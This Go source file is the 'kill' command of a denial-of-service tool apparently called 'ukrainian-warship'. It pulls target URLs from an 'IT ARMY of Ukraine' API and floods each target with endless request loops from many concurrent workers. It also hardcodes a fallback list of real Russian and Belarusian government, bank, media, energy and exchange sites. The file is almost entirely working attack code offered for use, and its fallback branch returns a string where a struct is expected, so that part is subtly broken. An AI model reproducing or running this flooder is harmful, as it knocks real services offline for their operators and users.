/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"time"

	"github.com/briandowns/spinner"
	"github.com/seedpockets/ukrainian-warship/pkg/api_client"
	"github.com/seedpockets/ukrainian-warship/pkg/fasttest"
	"github.com/spf13/cobra"
)

// killCmd represents the kill command
var killCmd = &cobra.Command{
	Use:   "kill",
	Short: "Run automatic attack",
	Long: `Fetches IT ARMY of Ukraine targets(from official api) and attacks. 

Periodically updates target list and evenly spreads load among online
targets.

Default worker amount is 5 per target.`,
	Run: func(cmd *cobra.Command, args []string) {
		singleTarget, _ := cmd.Flags().GetString("target")
		debug, _ := cmd.Flags().GetBool("debug")
		workers, _ := cmd.Flags().GetInt("workers")
		refreshRate, _ := cmd.Flags().GetFloat64("refresh")
		if singleTarget != "" {
			KillSingleTarget(singleTarget, workers, debug)
		} else {
			KillAll(workers, refreshRate, debug)
		}
	},
}

func init() {
	rootCmd.AddCommand(killCmd)
	killCmd.Flags().String("target", "", "--target=https://ww.rt.com takes aim at a single target")
	killCmd.Flags().Int("workers", 5, "--workers=1024 set number of workers per target")
	killCmd.Flags().Float64("refresh", 5, "--refresh=10 number of minutes between refreshing target URLs")
	killCmd.Flags().Bool("debug", false, "--debug=true defaults to false")
}

type total int64

func (c *total) inc() int64 {
	return atomic.AddInt64((*int64)(c), 1)
}

func (c *total) get() int64 {
	return atomic.LoadInt64((*int64)(c))
}

func KillSingleTarget(target string, workers int, debug bool) {
	var totalReq total
	var wg sync.WaitGroup
	spin := spinner.New(spinner.CharSets[1], 100*time.Millisecond) // Build our new spinner
	spin.Prefix = fmt.Sprintf("Attacking target: %s ", target)
	spin.Start()
	warship := fasttest.New(target)
	wg.Add(workers) // +1 for the terminal stats printer
	c1, cancel := context.WithCancel(context.Background())
	exitCh := make(chan struct{})
	for i := 0; i < workers; i++ {
		go func(ctx context.Context) {
			for {
				warship.Do()
				totalReq.inc()
				select {
				case <-ctx.Done():
					fmt.Println("received done, exiting in 50 milliseconds")
					time.Sleep(50 * time.Millisecond)
					wg.Done()
					exitCh <- struct{}{}
					return
				default:
				}
			}
		}(c1)
	}
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt)
	go func() {
		select {
		case <-signalCh:
			spin.Stop()
			cancel()
			return
		}
	}()
	<-exitCh
	wg.Wait()
	fmt.Printf("Target: %s\t\t Total requests: %d\n", target, totalReq)
}

func KillAll(workers int, refreshRate float64, debug bool) {
	targets, err := getTargets()
	if err != nil {
		panic(err)
	}
	var wg sync.WaitGroup
	spin := spinner.New(spinner.CharSets[1], 100*time.Millisecond) // Build our new spinner
	spin.Prefix = "Ukrainian Warship goes brrr.... "
	spin.Start()
	armada := make([]*fasttest.Fast, len(targets.Online))
	for i := 0; i < len(targets.Online); i++ {
		armada[i] = fasttest.New(targets.Online[i])
	}
	wg.Add(workers * len(targets.Online)) // +1 for the terminal stats printer
	c1, cancel := context.WithCancel(context.Background())
	exitCh := make(chan struct{})
	for _, v := range armada {
		for j := 0; j < workers; j++ {
			go func(ctx context.Context) {
				for {
					v.Do()
					v.TotalRequests.Inc()
					select {
					case <-ctx.Done():
						time.Sleep(50 * time.Millisecond)
						wg.Done()
						exitCh <- struct{}{}
						return
					default:
					}
				}
			}(c1)
		}
	}
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt)
	go func() {
		select {
		case <-signalCh:
			spin.Stop()
			cancel()
			return
		}
	}()
	<-exitCh
	wg.Wait()
	for _, v := range armada {
		fmt.Printf("Total requests: %d\t\tTarget: %s\n", v.TotalRequests, v.URL)
	}
}

//func KillAll(workers int, refreshRate float64, debug bool) {
//	var refreshTimeMinutes = time.Duration(refreshRate)
//	refreshTime := time.Now().Add(time.Minute * refreshTimeMinutes).Unix() // refresh targets interval
//	running := true
//	warships := []*stresstest.Warship{}
//	var totalRequests int64 = 0
//	for running {
//		if len(warships) <= 0 {
//			targets, err := getTargets()
//			if err != nil {
//				fmt.Println("Could not get targets")
//				panic(err.Error())
//			}
//			for i := 0; i < len(targets.Online); i++ {
//				warship, err := stresstest.New(targets.Online[i], debug, workers)
//				if err != nil {
//					fmt.Println("Failed to start Warship: ", targets.Online[i])
//				}
//				warship.Fire()
//				warships = append(warships, warship)
//			}
//		}
//		clearScreen()
//		fmt.Println(string(colorGreen) + "Updates targets every " + refreshTimeMinutes.String() + " min..." + string(colorReset))
//		fmt.Println("Request\t\tSuccess\t\tTarget")
//		fmt.Println("__________________________________________________________________")
//		for _, v := range warships {
//			fmt.Println(v)
//			totalRequests += v.AmountRequests
//		}
//		fmt.Printf("Total Request: %d", totalRequests)
//		if time.Now().Unix() > refreshTime {
//			fmt.Println("Refreshing targets!")
//			warships = []*stresstest.Warship{}
//			refreshTime = time.Now().Add(time.Minute * refreshTimeMinutes).Unix()
//		}
//		time.Sleep(time.Millisecond * 500)
//	}
//}

func getTargets() (*api_client.TargetsItArmy, error) {
	fmt.Println("Ukrainian Warship Acquiring targets...")
	targets := &api_client.TargetsItArmy{}
	targets, err := api_client.GetTargetsItArmyPpUa()
	if err != nil {
	    fmt.Println("Default targets are used...")
	    defaultTargets := `{"online":["https://rmk-group.ru/ru/","https://nangs.org/","https://www.nornickel.com/","https://www.evraz.com/ru/","https://www.polymetalinternational.com/ru/","https://lukoil.ru","https://www.uralkali.com/ru/","https://www.metalloinvest.com/","https://www.sibur.ru/","https://www.tmk-group.ru/"],"offline":["https://nlmk.com/","https://www.gazprom.ru/","https://www.severstal.com/","https://www.eurosib.ru/","https://www.gazprombank.ru/","https://www.gosuslugi.ru/","https://magnit.ru/","https://www.surgutneftegas.ru/","https://www.tatneft.ru/","https://www.sberbank.ru","https://www.vtb.ru/","https://www.mos.ru/uslugi/","http://kremlin.ru/","http://government.ru/","https://mil.ru/","https://www.nalog.gov.ru/","https://customs.gov.ru/","https://pfr.gov.ru/","https://rkn.gov.ru/","https://109.207.1.118/","https://109.207.1.97/","https://mail.rkn.gov.ru/","https://cloud.rkn.gov.ru/","https://mvd.gov.ru/","https://pwd.wto.economy.gov.ru/","https://stroi.gov.ru/","https://proverki.gov.ru/","https://ria.ru/","https://gazeta.ru/","https://kp.ru/","https://riafan.ru/","https://pikabu.ru/","https://kommersant.ru/","https://mk.ru/","https://yaplakal.com/","https://rbc.ru/","https://bezformata.com/","https://api.sberbank.ru/prod/tokens/v2/oauth","https://api.sberbank.ru/prod/tokens/v2/oidc","https://shop-rt.com","http://belta.by/","https://sputnik.by/","https://www.tvr.by/","https://www.sb.by/","https://belmarket.by/","https://www.belarus.by/","https://belarus24.by/","https://ont.by/","https://www.024.by/","https://www.belnovosti.by/","https://mogilevnews.by/","https://www.mil.by/","https://yandex.by/","https://www.slonves.by/","http://www.ctv.by/","https://radiobelarus.by/","https://radiusfm.by/","https://alfaradio.by/","https://radiomir.by/","https://radiostalica.by/","https://radiobrestfm.by/","https://www.tvrmogilev.by/","https://minsknews.by/","https://zarya.by/","https://grodnonews.by/","https://rec.gov.by/ru/","https://www.mil.by/","https://www.government.by/","https://www.prokuratura.gov.by/","https://president.gov.by/ru/","https://www.mvd.gov.by/ru/","http://www.kgb.by/ru/","https://belarusbank.by/","https://www.nbrb.by/","https://brrb.by/","https://www.belapb.by/","https://bankdabrabyt.by/","https://belinvestbank.by/individual/","https://bgp.by/ru/","https://www.belneftekhim.by/","http://www.bellegprom.by/","https://www.energo.by/","http://belres.by/ru/","https://mininform.gov.by/","https://www.moex.com/","https://www.moex.com/","https://www.bestchange.ru/tether-trc20-to-visa-mastercard-euro.html/","http://www.fsb.ru/","https://cleanbtc.ru/","https://bonkypay.com/","https://changer.club/","https://superchange.net","https://mine.exchange/","https://platov.co","https://ww-pay.net/","https://delets.cash/","https://betatransfer.org","https://ramon.money/","https://coinpaymaster.com/","https://bitokk.biz/","https://www.netex24.net","https://cashbank.pro/","https://flashobmen.com/","https://abcobmen.com/","https://ychanger.net/","https://multichange.net/","https://24paybank.ne","https://royal.cash/","https://prostocash.com/","https://baksman.org/","https://kupibit.me/","https://abcobmen.com","https://ya.ru/","https://omk.ru/"]}`
		return defaultTargets, err
	}
	fmt.Println("Targets acquired...")
	return targets, nil
}

func clearScreen() {
	fmt.Printf("\x1b[2J")
}
